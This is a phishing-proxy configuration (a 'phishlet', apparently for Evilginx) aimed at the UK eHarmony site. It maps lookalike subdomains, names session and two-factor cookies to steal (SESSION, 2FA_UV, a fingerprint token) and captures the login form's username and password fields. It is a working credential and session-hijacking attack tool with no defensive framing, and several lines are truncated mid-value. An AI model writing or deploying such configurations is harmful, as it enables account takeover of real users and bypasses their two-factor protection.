author: '@maliondev'
min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_login: true, auto_filter: false}
  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.co.uk', session: false, is_landing: false, auto_filter: false}  # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: fal>
sub_filters:
  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'www', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'tms', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>
auth_tokens:
  - domain: '.eharmony.co.uk'
    keys: ['2FA_UV']
  - domain: 'www.eharmony.co.uk'
    keys: ['SESSION', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef']

credentials:
  username:
    key: 'j_username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'j_password'
    search: '(.*)'

login:
  domain: 'www.eharmony.co.uk'
  path: '/login'
    
